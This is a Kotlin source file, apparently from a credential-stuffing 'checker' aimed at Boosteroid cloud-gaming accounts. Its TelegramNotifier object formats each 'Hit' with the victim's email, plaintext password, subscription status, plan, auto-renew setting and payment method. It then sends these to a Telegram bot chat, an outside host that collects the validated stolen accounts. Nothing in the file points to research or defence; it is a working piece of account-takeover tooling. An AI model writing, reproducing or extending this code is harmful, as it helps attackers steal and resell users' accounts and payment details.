package com.boosteroid.checker.utils

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import java.net.URLEncoder

object TelegramNotifier {
    private val client = OkHttpClient()

    suspend fun send(botToken: String, chatId: String, message: String): Boolean =
        withContext(Dispatchers.IO) {
            try {
                val encodedMsg = URLEncoder.encode(message, "UTF-8")
                val url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$encodedMsg&parse_mode=HTML"
                val request = Request.Builder().url(url).get().build()
                client.newCall(request).execute().isSuccessful
            } catch (e: Exception) { false }
        }

    fun buildResultMessage(email: String, password: String, status: String,
        planType: String?, autoRenew: String?, paymentMethod: String?) = buildString {
        appendLine("🎯 <b>Boosteroid Hit!</b>")
        appendLine("📧 <b>Email:</b> $email")
        appendLine("🔑 <b>Pass:</b> $password")
        appendLine("📊 <b>Status:</b> $status")
        planType?.let { appendLine("📦 <b>Plan:</b> $it") }
        autoRenew?.let { appendLine("🔄 <b>AutoRenew:</b> $it") }
        paymentMethod?.let { appendLine("💳 <b>Payment:</b> $it") }
    }
}
